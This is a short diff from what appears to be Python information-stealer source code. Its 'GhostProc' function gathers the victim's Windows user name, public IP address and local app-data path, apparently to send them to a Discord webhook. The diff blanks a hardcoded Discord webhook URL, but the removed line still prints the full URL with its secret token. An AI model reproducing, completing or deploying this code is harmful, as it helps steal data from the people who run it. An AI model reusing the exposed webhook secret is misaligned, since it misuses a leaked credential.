@@ -36,7 +36,7 @@ def GhostInf():
 
 
 def GhostProc():
-    hook = Webhook("https://discord.com/api/webhooks/832837385271115817/dF0dHOgykgEIk98BOLsokhKWLR3cxFDywUZiu5Gucmy8Fu5jXqHipmnT3aeQ_vnRwZIH")
+    hook = Webhook("")
     user = os.getenv("UserName")
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
